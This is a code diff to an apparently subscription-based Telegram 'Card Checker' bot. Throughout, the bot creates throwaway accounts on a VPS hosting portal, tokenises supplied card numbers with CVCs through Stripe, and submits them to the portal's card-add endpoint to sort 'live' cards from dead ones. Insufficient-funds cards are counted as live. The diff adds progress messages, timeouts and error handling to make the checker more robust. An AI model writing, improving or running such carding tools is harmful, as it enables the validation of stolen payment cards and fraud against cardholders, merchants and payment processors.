@@ -28,7 +28,7 @@ ADMIN_IDS = [5895491379]  # Your ID
 
 # CONTACT INFO
 CONTACT_INFO = {
-    'name': 'Mahmoud Saad ðŸ¥·ðŸ»',
+    'name': 'Mahmoud Saad 🥷🻸',
     'username': '@FastSpeedtest',
     'id': 5895491379
 }
@@ -437,47 +437,16 @@ def check_subscription(user_id):
 def generate_dashboard(chat_id):
     s = stats.get(chat_id)
     if not s:
-        return "âš ï¸ No data available."
-
-def generate_dashboard(chat_id):
-    s = stats.get(chat_id)
-    if not s:
         return "⚠️ No data available."
 
     msg = "📊 **CARD CHECKER RESULTS**\n\n"
     if s.get('visa_checked'):
         msg += f"💳 **Current:** `{s['visa_checked']}`\n"
-        msg += f"📌 **Status:** {s.get('response', 'Processing...')}\n\n"
+        msg += f"🔌 **Status:** {s.get('response', 'Processing...')}\n\n"
     else:
-        msg += f"📌 **Status:** {s.get('response', 'Starting...')}\n\n"
+        msg += f"🔌 **Status:** {s.get('response', 'Starting...')}\n\n"
 
-    msg += "━━━━━━━━━━━━━━━━━━━━\n\n"
-    
-    if s.get("lives"):
-        msg += "💳 **Live Cards:**\n"
-        for card in s["lives"]:
-            msg += f"`{card}`\n"
-            
-    # ضمان ألا تكون الرسالة فارغة
-    if len(msg.strip()) < 10:
-        msg = "🔄 **Checker Status:** Initializing..."
-    
-    return msg
-
-
-def generate_dashboard(chat_id):
-    s = stats.get(chat_id)
-    if not s:
-        return "⚠️ No data available."
-
-    msg = "📊 **CARD CHECKER RESULTS**\n\n"
-    if s.get('visa_checked'):
-        msg += f"💳 **Current:** `{s['visa_checked']}`\n"
-        msg += f"📌 **Status:** {s.get('response', 'Processing...')}\n\n"
-    else:
-        msg += f"📌 **Status:** {s.get('response', 'Starting...')}\n\n"
-
-    msg += "━━━━━━━━━━━━━━━━━━━━\n\n"
+    msg += "─────────────────────\n\n"
     
     if s.get("lives"):
         msg += "💳 **Live Cards:**\n"
@@ -567,9 +536,22 @@ def generate_subscription_panel():
     )
     return markup
 
+def update_message_safely(chat_id):
+    """Update message with error handling"""
+    try:
+        if chat_id in messages:
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=messages[chat_id],
+                text=generate_dashboard(chat_id),
+                parse_mode="Markdown",
+                reply_markup=generate_buttons(chat_id)
+            )
+    except Exception as e:
+        print(f"❌ Edit message error: {e}")
 
 # ==============================
-# CARD CHECKING FUNCTION
+# CARD CHECKING FUNCTION - FIXED VERSION
 def run_check(chat_id):
     cards = user_cards.get(chat_id, [])
     s = {"visa_checked":"","approved":0,"declined":0,"unknown":0,"total":0,"response":"",
@@ -583,19 +565,29 @@ def run_check(chat_id):
     email = generate_email()
     print(f"🎯 Starting check session with email: {email}")
     
+    s["response"] = "🔄 Registering account..."
+    stats[chat_id] = s
+    update_message_safely(chat_id)
+    
     # Register new account
     if not register_account(email):
-        s["response"] = "âŒ Account registration failed"
+        s["response"] = "❌ Account registration failed"
         stats[chat_id] = s
+        update_message_safely(chat_id)
         return
+
+    s["response"] = "🔑 Logging in..."
+    stats[chat_id] = s
+    update_message_safely(chat_id)
 
     # Login with generated email
     login_data = {"email": email, "password": "111222333"}
     login_response = session.post("https://portal.budgetvm.com/auth/login", data=login_data)
     
     if login_response.status_code != 200:
-        s["response"] = "âŒ Login failed"
+        s["response"] = "❌ Login failed"
         stats[chat_id] = s
+        update_message_safely(chat_id)
         return
 
     # GoogleAsk
@@ -609,17 +601,23 @@ def run_check(chat_id):
     session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)
 
     if "ePortalv1" not in session.cookies.get_dict():
-        s["response"] = "âŒ Login/GoogleAsk failed"
+        s["response"] = "❌ Authentication failed"
         stats[chat_id] = s
+        update_message_safely(chat_id)
         return
 
-    print(f"âœ… Successfully logged in with: {email}")
+    print(f"✅ Successfully logged in with: {email}")
+    
+    s["response"] = "🚀 Starting card checks..."
+    stats[chat_id] = s
+    update_message_safely(chat_id)
     
     # Check cards with delay
     for i, card in enumerate(cards):
         if stop_flag.get(chat_id):
-            s["response"] = "â¹ï¸ Check stopped"
+            s["response"] = "⏹️ Check stopped by user"
             stats[chat_id] = s
+            update_message_safely(chat_id)
             break
 
         s["total"] += 1
@@ -629,21 +627,30 @@ def run_check(chat_id):
             card_number, exp_month, exp_year, cvc = card.split("|")
         except:
             s["cvv"] += 1
-            s["response"] = "âŒ Invalid card format"
+            s["response"] = "❌ Invalid card format"
+            stats[chat_id] = s
+            update_message_safely(chat_id)
             continue
 
         # Add 15 second delay between card requests (except for first card)
         if i > 0:
-            print(f"â³ Waiting 15 seconds before next card...")
+            print(f"⏳ Waiting 15 seconds before next card...")
             for countdown in range(15, 0, -1):
                 if stop_flag.get(chat_id):
-                    s["response"] = "â¹ï¸ Check stopped"
+                    s["response"] = "⏹️ Check stopped by user"
                     stats[chat_id] = s
+                    update_message_safely(chat_id)
                     return
+                
+                s["response"] = f"⏳ Waiting {countdown}s before next card..."
+                stats[chat_id] = s
+                update_message_safely(chat_id)
                 time.sleep(1)
 
         print(f"📝 Checking card {i+1}/{len(cards)}: {card_number[:4]}****{card_number[-4:]}")
-
+        s["response"] = f"🔍 Checking card {i+1}/{len(cards)}..."
+        stats[chat_id] = s
+        update_message_safely(chat_id)
 
         # Stripe Token
         muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
@@ -653,55 +660,103 @@ def run_check(chat_id):
             f"&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}"
         )
 
-        stripe_response = session.post("https://api.stripe.com/v1/tokens", headers=stripe_headers, data=stripe_data)
-        resp_json = stripe_response.json()
+        try:
+            stripe_response = session.post("https://api.stripe.com/v1/tokens", headers=stripe_headers, data=stripe_data)
+            stripe_json = stripe_response.json()
 
-        if "id" not in resp_json:
-            s["cvv"] += 1
-            s["response"] = "âŒ Token creation failed"
-        else:
-            token_id = resp_json["id"]
+            if "id" not in stripe_json:
+                s["cvv"] += 1
+                s["response"] = "❌ Token creation failed"
+                error_msg = stripe_json.get('error', {}).get('message', 'Unknown error')
+                print(f"❌ Stripe error: {error_msg}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+                
+            token_id = stripe_json["id"]
+            print(f"✅ Stripe token created: {token_id}")
+            
+            # BudgetVM card add request
             card_response = session.post(
                 "https://portal.budgetvm.com/MyGateway/Stripe/cardAdd",
                 headers=budget_headers,
                 cookies=session.cookies.get_dict(),
-                data={"stripeToken": token_id}
+                data={"stripeToken": token_id},
+                timeout=30
             )
-        try:
-            resp_json = card_response.json()
-        except:
+            
+            print(f"📡 BudgetVM Response Status: {card_response.status_code}")
+            print(f"📡 BudgetVM Response Text: {card_response.text[:200]}...")
+            
+            # Handle response
+            if card_response.status_code != 200:
+                s["unknown"] += 1
+                s["response"] = f"❌ HTTP Error {card_response.status_code}"
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+                
+            try:
+                resp_json = card_response.json()
+                print(f"📨 Parsed JSON: {resp_json}")
+            except:
+                s["unknown"] += 1
+                s["response"] = "⚠️ Invalid JSON response"
+                print(f"❌ Failed to parse JSON. Raw response: {card_response.text}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+
+            # Process result
+            result = str(resp_json.get("result", "Unknown"))
+            success = resp_json.get("success", False)
+            
+            print(f"🔍 Processing result - Success: {success}, Result: {result}")
+            
+            if success is True or success == "true":
+                s["approved"] += 1
+                s["response"] = f"✅ {result}"
+                s["lives"].append(card)
+                print(f"✅ APPROVED: {card}")
+            elif "does not support" in result.lower() or "blocked" in result.lower() or "not supported" in result.lower():
+                s["ccn"] += 1
+                s["response"] = f"🚫 {result}"
+                print(f"🚫 BLOCKED: {result}")
+            elif "declined" in result.lower() or "card was declined" in result.lower():
+                s["declined"] += 1
+                s["response"] = f"❌ {result}"
+                print(f"❌ DECLINED: {result}")
+            elif "insufficient funds" in result.lower():
+                s["approved"] += 1  # CVV matched but insufficient funds = LIVE
+                s["response"] = f"✅ {result}"
+                s["lives"].append(card)
+                print(f"✅ LIVE (Insufficient Funds): {card}")
+            else:
+                s["unknown"] += 1
+                s["response"] = f"⚠️ {result}"
+                print(f"⚠️ UNKNOWN: {result}")
+
+            stats[chat_id] = s
+            update_message_safely(chat_id)
+
+        except requests.exceptions.Timeout:
             s["unknown"] += 1
-            s["response"] = "⚠️ Unknown response"
-            continue
-
-        result = str(resp_json.get("result", ""))
-        if resp_json.get("success") is True:
-            s["approved"] += 1
-            s["response"] = f"✅ {result}"
-            s["lives"].append(card)
-        elif "does not support" in result.lower() or "blocked" in result.lower():
-            s["ccn"] += 1
-            s["response"] = f"🚫 {result}"
-        elif "declined" in result.lower():
-            s["declined"] += 1
-            s["response"] = f"❌ {result}"
-        else:
-            s["unknown"] += 1
-            s["response"] = f"⚠️ {result}"
-
-        stats[chat_id] = s
-
-        # Update message
-        try:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=messages[chat_id],
-                text=generate_dashboard(chat_id),
-                parse_mode="Markdown",
-                reply_markup=generate_buttons(chat_id)
-            )
+            s["response"] = "⏰ Request timeout"
+            print(f"⏰ Timeout for card: {card}")
+            stats[chat_id] = s
+            update_message_safely(chat_id)
         except Exception as e:
-            print("Edit error:", e)
+            s["unknown"] += 1
+            s["response"] = f"❌ Error: {str(e)[:30]}..."
+            print(f"❌ Exception during check: {e}")
+            stats[chat_id] = s
+            update_message_safely(chat_id)
+            
+    # Final update when checking is complete
+    if not stop_flag.get(chat_id):
+        s["response"] = f"🏁 Check completed! {s['approved']} approved of {s['total']} total"
+        stats[chat_id] = s
+        update_message_safely(chat_id)
 
 # ==============================
 # BOT COMMANDS
@@ -722,7 +777,7 @@ def send_welcome(message):
             message.chat.id, 
             f"🚫 **Access Denied**\n\n"
             f"❌ You don't have an active subscription!\n\n"
-            f"📌 **Your ID:** `{user_id}`\n"
+            f"🔌 **Your ID:** `{user_id}`\n"
             f"👤 **Contact Admin:** {CONTACT_INFO['name']}\n"
             f"📝 **Username:** {CONTACT_INFO['username']}\n"
             f"🔗 **Admin ID:** `{CONTACT_INFO['id']}`\n\n"
@@ -741,7 +796,7 @@ def send_welcome(message):
             "🚀 **Card Checker Bot**\n"
             "💳 Use /check to start checking cards\n"
             "🛠️ Use Admin Panel for management\n\n"
-            "📌 **Commands:**\n"
+            "🔌 **Commands:**\n"
             "• `/check` - Start card checking\n"
             "• `/admin` - Admin panel",
             parse_mode="Markdown",
@@ -757,7 +812,7 @@ def send_welcome(message):
             f"🚀 **Card Checker Bot**\n"
             f"✅ **Subscription Status:** Active\n"
             f"{sub_text}\n\n"
-            f"📌 **Commands:**\n"
+            f"🔌 **Commands:**\n"
             f"• `/check` - Start card checking\n\n"
             f"💳 Ready to check your cards!",
             parse_mode="Markdown"
@@ -799,7 +854,7 @@ def ask_for_cards(message):
             message.chat.id, 
             f"🚫 **Subscription Required**\n\n"
             f"❌ You need an active subscription to use this service!\n\n"
-            f"📌 **Your ID:** `{user_id}`\n"
+            f"🔌 **Your ID:** `{user_id}`\n"
             f"⚠️ Contact admin for subscription:",
             parse_mode="Markdown",
             reply_markup=markup
